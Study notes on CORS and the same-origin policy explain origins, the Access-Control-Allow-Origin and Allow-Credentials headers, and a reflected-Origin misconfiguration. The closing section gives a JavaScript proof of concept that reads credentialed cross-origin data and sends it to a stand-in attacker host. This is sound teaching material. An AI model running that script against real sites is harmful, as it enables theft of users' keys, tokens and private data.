## What is CORS (cross-origin resource sharing)?

- browser mechanism which enables controlled access to resources located outside of a given domain
- extends and adds flexibility to the same-origin policy (SOP)
- not a protection against CSRF
- provides potential for cross-domain attacks

## SOP (same-origin policy)

- web browser security mechanism that aims to prevent websites from attacking each other
- restricts scripts on one origin from accessing data from another origin
- origin consists of a URL scheme, domain and port number

eg - `http://normal-website.com/example/example.html`

- `http` - scheme
- `normal-website.com` - domain
- with port 80

| URL accessed                            | Access Permitted?                 |
| --------------------------------------- | --------------------------------- |
| http://normal-website.com/example/      | Yes: same scheme, domain and port |
| http://normal-website.com/example2/     | Yes: same scheme, domain and port |
| https://normal-website.com/example      | No: different scheme and port     |
| http://en.normal-website.com/example    | No: different domain              |
| http://www.normal-website.com/example/  | No: different domain              |
| http://normal-website.com:8080/example/ | No: different port                |

## Relaxation of the same-origin policy

- SOP is very restrictive
- many websites interactive with subdomains or third-party sites in a way that requires full cross-origin access
- a controlled relaxation of the SOP is possible using cross-origin resource sharing (CORS)

## Access-Contorl-Allow-Origin

- `Access-Control-Allow-Origin` header - included in the `response` from one website to a request originating from another website and identifies the permitted origin of the request
- web browser compares the `Access-Control-Allow-Origin` with the requesting website's origin and permits access to the response if they match

eg - suppose a website with origin `normal-website.com` causes the following cross-domain request:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

The server on `robust-website.com` returns the following response:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

The specification of `Access-Control-Allow-Origin` allows for multiple origins or the vaule `null`, or wildcard `*`.

## Access-Control-Allow-Credentials

- default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header
- but can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true.

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

Response to the request is

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

The Header Access-Control-Allow-Origin supports wildcards.
eg - `Access-Control-Allow-Origin: *`

But you cannot combine the wildcard with the cross-origin trasfer of credentials.

## Vulnerablities arising from CORS

### Server-generated ACAO header from client-specified Origin header

For example, consider an application that receives the following request:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It responds with :

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

These headers state that access is allowed from the requesting domain and that the cross-origin requests can include cookies.
If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open("get", "https://vulnerable-website.com/sensitive-victim-data", true);
req.withCredentials = true;
req.send();

function reqListener() {
  location = "//malicious-website.com/log?key=" + this.responseText;
}
```
